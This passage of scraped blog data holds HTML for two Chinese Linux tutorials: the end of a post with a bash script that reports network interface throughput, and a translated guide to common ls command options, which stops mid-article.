T2=`cat /sys/class/net/$1/statistics/tx_bytes`\r\n        TBPS=`expr $T2 - $T1`\r\n        RBPS=`expr $R2 - $R1`\r\n        TKBPS=`expr $TBPS / 1024`\r\n        RKBPS=`expr $RBPS / 1024`\r\n        echo \"TX $1: $TKBPS kb/s RX $1: $RKBPS kb/s\"\r\ndone</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a635ac44c687356419825-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635ac44c687356419825-28\">28</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-1\"><span class=\"crayon-p\">#!/bin/bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-3\"><span class=\"crayon-v\">INTERVAL</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"1\"</span><span class=\"crayon-h\">  </span><span class=\"crayon-p\"># update interval in seconds</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-5\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">z</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$1\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">echo</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-7\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">echo </span><span class=\"crayon-v\">usage</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">network</span><span class=\"crayon-o\">-</span><span class=\"crayon-t\">interface</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">echo</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-9\"><span class=\"crayon-e\">        </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">g</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">eth0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-10\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">echo</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-11\"><span class=\"crayon-e\">        </span><span class=\"crayon-e\">exit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-12\"><span class=\"crayon-e\">fi</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-14\"><span class=\"crayon-st\">IF</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-16\"><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-17\"><span class=\"crayon-st\">do</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">R1</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">net</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">statistics</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">rx_bytes</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">T1</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">net</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">statistics</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tx_bytes</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">sleep</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">INTERVAL</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-21\"><span class=\"crayon-e\">        </span><span class=\"crayon-v\">R2</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">net</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">statistics</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">rx_bytes</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">T2</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sys</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">class</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">net</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">statistics</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tx_bytes</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">TBPS</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-i\">expr</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">T2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">T1</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">RBPS</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-i\">expr</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">R2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">R1</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">TKBPS</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-i\">expr</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">TBPS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">RKBPS</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">`</span><span class=\"crayon-i\">expr</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">RBPS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-sy\">`</span></div><div class=\"crayon-line\" id=\"crayon-5a635ac44c687356419825-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"TX $1: $TKBPS kb/s RX $1: $RKBPS kb/s\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635ac44c687356419825-28\"><span class=\"crayon-v\">done</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0041 seconds] -->\r\n\n</div>\n</div>\n<p>下面的屏幕截图显示了上面的两个脚本的输出。</p>\n<p><a title=\"如何在Linux下统计高速网络中的流量\" href=\"https://dn-linuxcn.qbox.me/data/attachment/album/201401/20/111511ua1cdxnc8ncu1sdz.jpg\" target=\"_blank\" rel=\"lightbox[5558]\"><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/2f570edeab36f18c3bf5fc0f64a8feea.jpg\" alt=\"152940zdJ\" width=\"640\" height=\"386\"></a></p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113226\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113226votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113226\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/662a63e34b6deebe6fc3d2666d88b8eafd6e2826.jpg"}
{"url_object_id": "bae67049a64d1e6081b8faffd0387ad3", "title": "ls 命令的 20 个实用范例", "url": "http://blog.jobbole.com/113277/", "create_date": "2017/12/10", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/84af875603b875a6afc4d722e5728a50.png"], "praise_nums": 1, "comment_nums": 1, "favor_nums": 2, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://linoxide.com/linux-command/linux-ls-command/\">Pungki Arianto</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-2535-1.html\">Linux中国/geekpi</a>   </div><p>Linux中一个基本命令是ls。没有这个命令，我们会在浏览目录条目时会遇到困难。这个命令必须被每个学习Linux的人知道。</p>\n<h3>ls是什么</h3>\n<p>ls命令用于列出文件和目录。默认上，他会列出当前目录的内容。带上参数后，我们可以用ls做更多的事情。这里是一些在日常操作中使用到的ls用法的示例。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/84af875603b875a6afc4d722e5728a50.png\" alt=\"\" width=\"256\" height=\"256\"></p>\n<h4>1. 不带参数运行ls</h4>\n<p>不带参数运行ls会只列出文件或者目录。看不到其他信息输出（译注：有时候你发现无参数的ls命令和这里描述的不同，那有可能是你的ls命令实际上带参数的ls别名）。</p>\n<p>$ ls</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/044cd236033b33f2d14505af2e67e3cf.png\" alt=\"\"></p>\n<h4>2. 使用长清单模式</h4>\n<p>使用-l字符(小写L字符),会显示当前目录内容的长列表。在接下来的例子中，我们会结合-l参数(这个参数经常使用)来得到更好的结果。</p>\n<p>$ ls -l</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/edf00b08735d1fe0fda00f88125da855.png\" alt=\"\"></p>\n<p>这里是如何读取输出 :</p>\n<ul>\n<li><strong>第1列</strong>\n<ul>\n<li>第一个字母<strong>d</strong>意味着内容是目录或者文件。在上面的截图中，Desktop、 Documents、 Downloads 和 lynis-1.3.8是目录。如果是’-‘(<strong>减号</strong>)，这意味着它的内容是文件。当它是l(<strong>小写l字符</strong>)，意味这内容是链接文件。</li>\n<li>下面的9个字符是关于文件权限。<strong>前3个rwx</strong>字符是文件的拥有者的权限，<strong>第二组3rwx</strong>是文件的所有组的权限，<strong>最后的rwx</strong>是对其他人访问文件的权限。</li>\n</ul>\n</li>\n<li><strong>第2列</strong> 这行告诉我们有多少链接指向这个文件。</li>\n<li><strong>第3列</strong> 这行告诉我们谁是这个文件/文件夹的所有者。</li>\n<li><strong>第4列</strong> 这行告诉我们谁是这个文件/文件夹的所有组。</li>\n<li><strong>第5列</strong> 这行告诉我们这个文件/文件夹的以字节为单位的大小。 目录的大小总是4096字节。</li>\n<li><strong>第6列</strong> 这告诉我们文件最后的修改时间。</li>\n<li><strong>第7列</strong> 这告诉我们文件名或者目录名。</li>\n</ul>\n<h4>3. 显示文件大小</h4>\n<p>以字节为单位看大小可能会不方便。6.5M读起来比6727680字节更简单。要这么做，我们可以使用-h与<strong>-l</strong>结合的参数。<strong>-h参数意味着便于人识别</strong>。</p>\n<p>$ ls -lh</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/6298085aaf7eb7f85d3c93a1c6309beb.png\" alt=\"\"></p>\n<p>另外一个可以这么做的参数是<strong>–si</strong>。这个参数和-h参数类似，但是<strong>-si以1000为单位，而-h以1024为单位</strong>。</p>\n<p>$ ls -si</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/f7a3f1cbf0703a87fd954ace24965c1a.png\" alt=\"\"></p>\n<h4>4. 排序文件大小</h4>\n<p>在我们可以显示文件大小之后，我们希望以文件大小排序。我们可以使用-S参数来这么做。这列表会从大到校排序。</p>\n<p>$ ls -lhS</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/e1b5eb2704dd97fc314e67e4253d66c0.png\" alt=\"\"></p>\n<h4>5. 测量大小</h4>\n<p>ls可以通过使用<strong>-block-size=SIZE</strong>改单位大小。这里的SIZE是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc668330699956524\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nK = Kilobyte\r\nM = Megabyte\r\nG = Gigabyte\r\nT = Terabyte\r\nP = Petabyte\r\nE = Exabyte\r\nZ = Zettabyte\r\nY = Yottabyte</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc668330699956524-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc668330699956524-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc668330699956524-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc668330699956524-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc668330699956524-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc668330699956524-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc668330699956524-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc668330699956524-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc668330699956524-1\"><span class=\"crayon-v\">K</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Kilobyte</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc668330699956524-2\"><span class=\"crayon-v\">M</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Megabyte</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc668330699956524-3\"><span class=\"crayon-v\">G</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Gigabyte</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc668330699956524-4\"><span class=\"crayon-v\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Terabyte</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc668330699956524-5\"><span class=\"crayon-v\">P</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Petabyte</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc668330699956524-6\"><span class=\"crayon-v\">E</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Exabyte</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc668330699956524-7\"><span class=\"crayon-v\">Z</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Zettabyte</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc668330699956524-8\"><span class=\"crayon-v\">Y</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Yottabyte</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>比如，我们希望使用MB作为单位大小。所以语法就会像这样:</p>\n<p>$ ls -l –block-size=M</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/ca5c2485695e0ff80466c1519c88c585.png\" alt=\"\"></p>\n<h4>6. 显示隐藏文件</h4>\n<p>在Linux中，以”.”(<strong>点号</strong>)开头的文件是隐藏文件。为了在ls命令中显示它，我们可以使用<strong>-a</strong>选项。</p>\n<p>$ ls -a</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/cfa7668f6caad7e44083bc934d667078.png\" alt=\"\"></p>\n<h4>7. 只列出目录条目</h4>\n<p>如果我们希望只列出目录，我们可以使用<strong>-d</strong>选项。</p>\n<p>$ ls -d */</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/88da387d50de04d574ae22943aa4d6d7.png\" alt=\"\"></p>\n<h4>8. 不打印所有者信息</h4>\n<p>要这么做，我们使用<strong>-g</strong>选项。</p>\n<p>$ ls -g</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/28da167a529bbe78d2aa9dc057887222.png\" alt=\"\"></p>\n<h4>9. 不打印组信息</h4>\n<p>-g隐藏了拥有者信息，<strong>—G</strong>会隐藏组信息。</p>\n<p>$ ls -lG</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/22d28b1330d26d2ce8f42d459fd4d97c.png\" alt=\"\"></p>\n<h4>10. 打印UID和GID</h4>\n<p>如果你想以数字方式列出项的所有者和所有组（即UID和GID），我们可以带<strong>-n</strong>选项使用ls命令。这里是个例子。</p>\n<p>$ ls -n</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/e23811f99ade6c4c4555f8092a4ecafa.png\" alt=\"\"></p>\n<p>从上面的例子中，我们知道<strong>用户pungki的UID</strong>是100，<strong>GID是1000</strong>，而<strong>root组的GID是0</strong>。</p>\n<h4>11. 不带颜色打印</h4>\n<p>一些Linux发行版已经对ls命令启用彩色。这会使ls以各种颜色打印列表。如果你不想要这样，你可以使用 <strong>–color=never</strong> 参数。</p>\n<p>$ ls –color=never</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/848f74362d015020fe7b695fb61e42c9.png\" alt=\"\"></p>\n<h4>12. 打印每个文件的索引号</h4>\n<p>为了打印索引或者大家俗称的inode号，我们可以使用-i选项。索引号会显示在第一列。</p>\n<p>$ ls -li</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/e0fecbc4db2799138efd4ef3c1742284.png\" alt=\"\"></p>\n<h4>13. 增加 / (斜线) 标记目录</h4>\n<p>要这么做，使用<strong>-p选项</strong>。</p>\n<p>$ ls -p</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/bdae6c864fb569e333c06a5c0d0b3f46.png\" alt=\"\"></p>\n<h4>14. 排序时反转顺序</h4>\n<p>你或许需要在列出条目时反转顺序。要这么做，你可以使用<strong>-r</strong>选项。</p>\n<p>$ ls -r</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/a63ce5ef9ed4d818faa1f2ebc3b5d13a.png\" alt=\"\"></p>\n<h4>15. 递归列出子目录</h4>\n<p>带<strong>-R</strong>参数后，你可以列出包含它子目录的目录。</p>\n<p>$ ls -R</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/3816d79aa013f2856ed1c49ee1627b17.png\" alt=\"\"></p>\n<h4>16. 扩展名排序</h4>\n<p>你可以使用-X参数或者–sort=extension来通过扩展名来排序（译注：这样对于筛选不同类型的文件很有用）。</p>\n<p>$ ls -lX</p>\n<p><strong>或</strong></p>\n<p>$ ls –sort=extension<strong><br>\n</strong></p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/4b1615d90fcb7e917808266d30980096.png\" alt=\"\"></p>\n<h4>17. 通过修改时间列出</h4>\n<p>使用-t选项会按修改时间排序，新的文件在前。</p>\n<p>$ ls -lt</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/7a10fe59414ec59d08d68322dc137f36.png\" alt=\"\"></p>\n<h4>18. 列出你的主目录</h4>\n<p>要列出你的主目录，你可以用”~”(<strong>波浪号</strong>)来代表它。这样你就不必输入完整的目录名。让我们假设家文件名为<strong>/home/pungki</strong>，那么<strong>波浪号</strong>就对/home/pungki有意义了。</p>\n<p>$ ls ~</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/5943c4c11a272abb12609d07dc2ae361.png\" alt=\"\"></p>\n<h4>19. 列出父目录</h4>\n<p>无论你在那个目录，你可以列出父目录而不必输入完整路径。这是个例子。</p>\n<p>$ ls ../</p>\n<p>这回列出<strong>1</strong>层之上的目录内容。</p>\n<p>$ ls ../../</p>\n<p>这回列出<strong>2</strong>层之上的目录内容（译注：可不支持“…”来代表2层之上）。</p>\n<p><img class=\"aligncenter\" 